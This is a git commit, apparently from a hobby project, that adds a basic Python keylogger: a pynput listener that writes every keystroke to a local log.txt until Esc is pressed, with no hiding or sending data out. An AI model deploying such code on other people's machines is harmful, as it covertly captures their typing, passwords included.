02369eec33001fdb6103cceefae450e134589ce4
Archit Gaur <architgaur25@gmail.com>
2020-03-15 20:46:30 +0530

    Basic Key Logger

--- script1.py
+++ script1.py
@@ -1,1 +1,33 @@
-print("Hello")
+from pynput.keyboard import Key, Listener
+
+keys = []
+count = 0
+
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    # if count >= 10:
+    #     count = 0
+    write_file(keys)
+    keys = []
+
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0 or k.find("enter") > 0:
+                f.write("\n")
+            elif k.find("Key") == -1:
+                f.write(k)
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
